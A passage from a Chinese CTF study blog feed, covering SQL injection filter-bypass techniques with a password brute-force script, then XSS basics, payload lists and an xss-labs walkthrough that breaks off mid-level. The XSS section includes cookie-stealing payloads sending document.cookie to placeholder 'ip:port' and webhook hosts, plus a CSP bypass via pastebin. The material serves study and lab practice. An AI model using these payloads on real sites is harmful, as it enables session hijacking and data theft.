class="hljs-string">f&#x27;bbccd<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span> + <span class="hljs-built_in">chr</span>(j + <span class="hljs-number">2</span>)<br>                password2 = <span class="hljs-string">&#x27;0&#x27;</span> * (i - <span class="hljs-number">1</span>) + <span class="hljs-built_in">chr</span>(j + <span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">16</span> - i)<br>            signup(username2, password2)<br>            token2 = base64.b64encode(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;username2&#125;</span>:<span class="hljs-subst">&#123;password2&#125;</span>&quot;</span>.encode()).decode()<br>            flag = note(token2, i, username1, username2)<br>            <span class="hljs-keyword">if</span> (flag == <span class="hljs-string">&quot;yes&quot;</span>):<br>                p += <span class="hljs-built_in">chr</span>(j+<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">print</span>(p)<br>                <span class="hljs-keyword">break</span><br><span class="hljs-comment"># 8336883846371110</span><br></code></pre></td></tr></table></figure><p>缩小爆破范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>one = <span class="hljs-string">&#x27;89&#x27;</span><br>two = <span class="hljs-string">&#x27;34&#x27;</span><br>three = <span class="hljs-string">&#x27;34&#x27;</span><br>four = <span class="hljs-string">&#x27;67&#x27;</span><br>five = <span class="hljs-string">&#x27;89&#x27;</span><br>six = <span class="hljs-string">&#x27;89&#x27;</span><br>senve = <span class="hljs-string">&#x27;34&#x27;</span><br>eight = <span class="hljs-string">&#x27;89&#x27;</span><br>nine = <span class="hljs-string">&#x27;45&#x27;</span><br>ten = <span class="hljs-string">&#x27;67&#x27;</span><br>eleven = <span class="hljs-string">&#x27;34&#x27;</span><br>twe = <span class="hljs-string">&#x27;78&#x27;</span><br>thir = <span class="hljs-string">&#x27;12&#x27;</span><br>fort = <span class="hljs-string">&#x27;12&#x27;</span><br>fif = <span class="hljs-string">&#x27;12&#x27;</span><br>sist = <span class="hljs-string">&#x27;01&#x27;</span><br><br><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> one:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> two:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> three:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> four:<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> five:<br>                    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> six:<br>                        <span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> senve:<br>                            <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> eight:<br>                                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nine:<br>                                    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> ten:<br>                                        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> eleven:<br>                                            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> twe:<br>                                                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> thir:<br>                                                    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> fort:<br>                                                        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> fif:<br>                                                            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> sist:<br>                                                                payload = a + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p<br>                                                                username = <span class="hljs-string">&quot;Administrator&quot;</span><br>                                                                password = payload<br>                                                                header = &#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>&#125;<br>                                                                token = base64.b64encode(<br>                                                                    <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>.encode()).decode()<br>                                                                fi = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>                                                                fi.write(password+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                                                                fi.close()<br>                                                                fi = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;token.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>                                                                fi.write(token+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                                                                fi.close()<br><span class="hljs-comment">#8446993857382221</span><br></code></pre></td></tr></table></figure><h2 id="进阶"><a class="markdownIt-Anchor" href="#进阶"></a> 进阶</h2><p>应对各种过滤技巧</p><h3 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h3><h4 id="注释符绕过"><a class="markdownIt-Anchor" href="#注释符绕过"></a> 注释符/**/绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT/**/name/**/FROM/**/table<br></code></pre></td></tr></table></figure><h4 id="用tab代替空格"><a class="markdownIt-Anchor" href="#用tab代替空格"></a> 用Tab代替空格</h4><h4 id="20绕过"><a class="markdownIt-Anchor" href="#20绕过"></a> %20绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT%20name%20FROM%20table<br></code></pre></td></tr></table></figure><h4 id="使用url编码绕过"><a class="markdownIt-Anchor" href="#使用url编码绕过"></a> 使用<strong>url编码</strong>绕过</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 发出去就是空格的意思，但是需要在burp中抓包后修改<br></code></pre></td></tr></table></figure><h4 id="使用回车替代"><a class="markdownIt-Anchor" href="#使用回车替代"></a> 使用回车替代</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">回车的ascii为chr<span class="hljs-comment">(13)</span>&amp;chr<span class="hljs-comment">(10)</span>，url编码为<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><h4 id="双空格"><a class="markdownIt-Anchor" href="#双空格"></a> 双空格</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">适用于过滤是替换一个空格<br></code></pre></td></tr></table></figure><h4 id="用括号绕过"><a class="markdownIt-Anchor" href="#用括号绕过"></a> 用括号绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select(user())from dual where(1=1)and(2=2)<br></code></pre></td></tr></table></figure><h3 id="过滤引号"><a class="markdownIt-Anchor" href="#过滤引号"></a> 过滤引号</h3><h4 id="27代替引号"><a class="markdownIt-Anchor" href="#27代替引号"></a> %27代替引号</h4><h4 id="十六进制绕过"><a class="markdownIt-Anchor" href="#十六进制绕过"></a> 十六进制绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">原语句：select column_name  from information_schema.tables where table_name=0x7573657273   //hex(users)   只能对参数使用<br></code></pre></td></tr></table></figure><h4 id="ascii码绕过"><a class="markdownIt-Anchor" href="#ascii码绕过"></a> ASCII码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)<br></code></pre></td></tr></table></figure><h3 id="过滤等于号"><a class="markdownIt-Anchor" href="#过滤等于号"></a> 过滤等于号</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">用 like 代替 ：a=<span class="hljs-selector-tag">b</span>  ---&gt;&gt;&gt; <span class="hljs-selector-tag">a</span> like <span class="hljs-selector-tag">b</span><br>regexp 代替等于号<span class="hljs-selector-tag">a</span> regexp <span class="hljs-selector-tag">b</span> ，regexp是正则<br></code></pre></td></tr></table></figure><h3 id="过滤逗号"><a class="markdownIt-Anchor" href="#过滤逗号"></a> <strong>过滤逗号</strong></h3><h4 id="使用from关键字绕过"><a class="markdownIt-Anchor" href="#使用from关键字绕过"></a> 使用from关键字绕过</h4><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br></code></pre></td></tr></table></figure><h4 id="使用join关键字绕过"><a class="markdownIt-Anchor" href="#使用join关键字绕过"></a> 使用<strong>join关键字</strong>绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select 1,2<br>等价于<br>union select * from (select 1)a join (select 2)b<br></code></pre></td></tr></table></figure><h4 id="使用offset关键字绕过"><a class="markdownIt-Anchor" href="#使用offset关键字绕过"></a> 使用<strong>offset关键字</strong>绕过</h4><p>对于limit可以使用offset来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from news limit 0,1<br>等价于<br>select * from news limit 1 offset 0<br></code></pre></td></tr></table></figure><h3 id="过滤注释符和"><a class="markdownIt-Anchor" href="#过滤注释符和"></a> 过滤注释符(#和–+)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>）最后的or &#x27;<span class="hljs-number">1</span>闭合查询语句的最后的单引号：id=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>||&#x27;<span class="hljs-number">1</span><br><span class="hljs-attribute">2</span>）%<span class="hljs-number">23</span>绕过<br><span class="hljs-attribute">3</span>）;%<span class="hljs-number">00</span>绕过<br></code></pre></td></tr></table></figure><h3 id="过滤关键字"><a class="markdownIt-Anchor" href="#过滤关键字"></a> 过滤关键字</h3><h4 id="分割关键字"><a class="markdownIt-Anchor" href="#分割关键字"></a> 分割关键字</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">用<span class="hljs-regexp">/**/</span>，&lt;&gt; 分割：sel&lt;&gt;ect、sel<span class="hljs-regexp">/**/</span>ect<br></code></pre></td></tr></table></figure><h4 id="使用加号拆解字符串"><a class="markdownIt-Anchor" href="#使用加号拆解字符串"></a> 使用<strong>加号+拆解字符串</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )<br></code></pre></td></tr></table></figure><h4 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">id=-1&#x27;UnIoN/**/SeLeCT<br></code></pre></td></tr></table></figure><h4 id="双写绕过"><a class="markdownIt-Anchor" href="#双写绕过"></a> 双写绕过</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">适用于剥离关键字的<br></code></pre></td></tr></table></figure><h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h4><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-number">16</span>进制编码，url编码，<span class="hljs-keyword">ascii</span>编码(都只对参数有效)<br></code></pre></td></tr></table></figure><h3 id="过滤连接关键字"><a class="markdownIt-Anchor" href="#过滤连接关键字"></a> 过滤连接关键字</h3><h4 id="过滤concat"><a class="markdownIt-Anchor" href="#过滤concat"></a> 过滤concat()</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">使用make_<span class="hljs-keyword">set</span>（）代替<br></code></pre></td></tr></table></figure><img src="/2023/01/31/SQL%E6%B3%A8%E5%85%A5/2.jpg" class=""><p><a href="https://blog.csdn.net/weixin_46079186/article/details/120991059">make_set()用法</a></p><p><code>make_set(bits,str1,str2,…)</code>会将bits(十进制)转为二进制然后取二进制反码，然后从左到右每一位对应一个字符，如果该位为1，则输出该位对应的字符</p><h3 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&quot;%secure_file%&quot;</span>;<br>当值为空时，mysql可以读取任何文件<br>当值为某一路径时，只有改路径下的文件能够被mysql读取<br></code></pre></td></tr></table></figure><p><code>load_file(path)</code>（需要root权限）可以用user()查看权限</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">user</span>()<span class="hljs-meta">#</span><br><span class="hljs-number">0</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">load_file</span>()<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="无列名注入"><a class="markdownIt-Anchor" href="#无列名注入"></a> 无列名注入</h3><p>通常获取列名是通过<code>information_schema</code>，但有时会被过滤</p><p>可以先查表名</p><p>1.InnoDb引擎</p><p>MYSQL5.5.8之后，InnoDB成为其默认存储引擎。</p><p>MYSQL5.6以上版本，增加了innodb_index_stats和innodb_table_stats两张表，可以获取数据库和表名，但无列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select group_concat(table_name)from mysql.innodb_index_stats where database_name=database()<br>union select group_concat(table_name)from mysql.innodb_table_stats where database_name=database()<br></code></pre></td></tr></table></figure><p>2.sys数据库</p><p>5.7以上的MYSQL，新增了sys数据库，可以通过schema_auto_increment_columns获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select table_name from sys.schema_table_statistics_with_buffer where table_schema = database()<br>select table_name from sys.schema_auto_increment_columns where table_schema =&#x27;ctf&#x27;<br></code></pre></td></tr></table></figure><p>原理：通过联合查询构造虚拟表将数据外带，通过自定义列名，再从虚拟表中查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select `2` from (select 1,2,3 union select * from test)n<br></code></pre></td></tr></table></figure><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> <em>参考资料</em></h3><p><em><a href="https://ctf-wiki.org/web/sqli/">https://ctf-wiki.org/web/sqli/</a></em></p><p><em><a href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></em></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#using-conditional-statements">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MySQL Injection.md#using-conditional-statements</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/01/25/XSS/"/>
    <url>/2023/01/25/XSS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xss.pt/">XSS平台</a></p><h3 id="xss基础"><a class="markdownIt-Anchor" href="#xss基础"></a> XSS基础</h3><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p><p>能够让我们输入的前端代码在页面中显示时，就会起作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form&gt;<br>    Name:&lt;input name=<span class="hljs-string">&quot;name&quot;</span>&gt;<br>&lt;/form&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Name:&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/25/XSS/2.jpg" class=""><p>查看页面源码，可以看到插入的代码在页面中显示出来</p><img src="/2023/01/25/XSS/3.jpg" class=""><h3 id="三种xss漏洞"><a class="markdownIt-Anchor" href="#三种xss漏洞"></a> 三种XSS漏洞</h3><p>最终目的都是使插入的js代码能够显示在html页面</p><h4 id="反射型-xss"><a class="markdownIt-Anchor" href="#反射型-xss"></a> 反射型 XSS</h4><p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 <strong>URL 地址的参数</strong>中。</p><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p><h4 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss"></a> 存储型XSS</h4><p>存储型XSS漏洞与反射型XSS相比，不需要控制请求参数，只需把XSSpayload存入数据库里，下次再访问时让程序从数据库来取出来展示即可。最常见例子是留言板，如果每个网站的留言板没有做过滤，直接把用户输入的内容原样记录下来，那么其他任何访问到这个网站的用户都会触发这个漏洞，执行到XSSpayload中的代码。</p><h4 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss"></a> DOM型XSS</h4><p>DOM型XSS漏洞算是反射型漏洞的一种，开发者将用户的输入作为JS或者HTML代码给执行了。</p><p>例如</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var name=document.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;name=&quot;</span>)</span>+<span class="hljs-number">5</span>;<br>document.write(decode<span class="hljs-constructor">URL(<span class="hljs-params">document</span>.URL.<span class="hljs-params">substring</span>(<span class="hljs-params">name</span>,<span class="hljs-params">document</span>.URL.<span class="hljs-params">length</span>)</span>));<br></code></pre></td></tr></table></figure><p>代码会将name的值直接写到页面</p><h3 id="xss构造"><a class="markdownIt-Anchor" href="#xss构造"></a> XSS构造</h3><p>script标签测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不能直接插入script标签去进行XSS，则需要借助其他标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&#x27;xxxx&#x27;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt; #src随意写一个图片地址，则会触发onerror<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&#x27;xxxx&#x27;</span> <span class="hljs-attribute">onload</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt; #资源加载时会被执行<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&#x27;xxxx&#x27;</span> <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt; #鼠标略过这个元素时会被执行<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&#x27;xxxx&#x27;</span> <span class="hljs-attribute">onfocus</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>&gt; #页面焦点聚集到这个元素时执行<br>窃取cookie的几种方式：<br>&lt;script&gt;new Image().<span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://ip:port/&quot;</span>+document.cookie&lt;/script&gt; #获取cookie，<br>&lt; img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=window.open(&#x27;http://ip:port/&#x27;+document.cookie)&gt;<br>&lt;script&gt;document.<span class="hljs-attribute">location</span>=<span class="hljs-string">&quot;http://ip:port?cookie=&quot;</span>+encodeURIComponent(document.cookie)&lt;/script&gt; #+很多时候要url编码<br>&lt;<span class="hljs-attribute">linktype</span>=<span class="hljs-string">&quot;text/css&quot;</span>href=&quot;http://[%YOUR_HOST%]/some_redirect<span class="hljs-string">&quot;&gt; #http还可以换成gopher协议进行ssrf</span><br><span class="hljs-string">javascript伪协议</span><br><span class="hljs-string">&lt;a href=javascript:alert(1)&gt;Link&lt;/a&gt;</span><br><span class="hljs-string">&lt;a href=javascript://123alert(1)&gt;Link&lt;/a&gt;</span><br><span class="hljs-string">window.location = &#x27;javascript:alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><p>让访问者去访问指定的路径然后把访问结果带给webhook</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">fetch<span class="hljs-params">(`/flag`)</span><span class="hljs-string">.then</span><span class="hljs-params">(<span class="hljs-attr">t</span>=&gt;t.text()</span>)<span class="hljs-string">.then</span><span class="hljs-params">(<span class="hljs-attr">t</span>=&gt;<span class="hljs-attr">location</span>=`https://webhook/?<span class="hljs-attr">f</span>=`+encodeURIComponent(t)</span>) <span class="hljs-comment">#/flag是指定的路径</span><br></code></pre></td></tr></table></figure><p>一些payload可以直接用hackbar生成</p><p>内容安全策略限制时，<code>&lt;script src=url&gt;</code>,<code>url</code>只能是指定的url</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;script-src https://hcaptcha.com https://*.hcaptcha.com https://pastebin.com&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><code>&lt;script src=&gt;</code>以<code>https://pastebin.com</code>为跳板窃取cookie：</p><ul><li>在<code>https://pastebin.com</code>写<code>location='https://webhook.site/116a7075-66f8-41d3-8eb8-7c47d3710343/?cookie='+document.cookie</code></li><li><code>&lt;script src=https://pastebin.com/dl/EgJQ6Nqj&gt;</code></li></ul><h3 id="xss靶场wp"><a class="markdownIt-Anchor" href="#xss靶场wp"></a> xss靶场wp</h3><h4 id="xss-labslevel1php"><a class="markdownIt-Anchor" href="#xss-labslevel1php"></a> xss-labs/level1.php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br>&lt;script&gt;<br>window.alert = function()  <br>&#123;     <br>confirm(&quot;完成的不错！&quot;);<br> window.location.href=&quot;level2.php?keyword=test&quot;; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level1&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;<br>&lt;?php <br>ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;name&quot;];<br>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;<br>?&gt;<br>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;<br>&lt;?php <br>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;<br>?&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-built_in">str</span> = $<span class="hljs-variable">_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.$<span class="hljs-built_in">str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br>这里<span class="hljs-built_in">name</span>直接作为参数放到html标签中，没有做任何的过滤和检查，存在明显的 XSS 漏洞。<br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">window.alert <span class="hljs-operator">=</span> function()  <br>&#123;     <br>confirm(<span class="hljs-string">&quot;完成的不错！&quot;</span>)<span class="hljs-comment">;</span><br> window.location.href<span class="hljs-operator">=</span><span class="hljs-string">&quot;level2.php?keyword=test&quot;</span><span class="hljs-comment">; </span><br>&#125;<br>重写alert，当触发alert时会通关<br></code></pre></td></tr></table></figure><p>exp:<code>name=&lt;script&gt;alert('aaa')&lt;/script&gt;</code></p><h4 id="xss-labslevel2php"><a class="markdownIt-Anchor" href="#xss-labslevel2php"></a> xss-labs/level2.php</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;!DOCTYPE 